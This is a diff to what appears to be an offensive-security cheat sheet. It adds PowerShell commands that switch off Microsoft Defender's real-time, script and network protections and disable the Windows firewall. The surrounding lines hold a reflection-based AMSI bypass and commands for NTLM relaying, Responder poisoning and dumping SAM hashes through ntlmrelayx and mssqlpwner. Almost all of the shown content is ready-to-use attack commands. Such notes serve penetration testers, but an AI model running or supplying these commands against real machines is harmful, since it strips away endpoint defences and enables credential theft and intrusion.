@@ -53,7 +53,11 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 ```
 
-
+# Kill Defender
+```
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
 
 
 # Useful Basic Commands
@@ -176,4 +180,5 @@ SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
 Fire up responder: `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 
 Perform the attack: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`
+
 
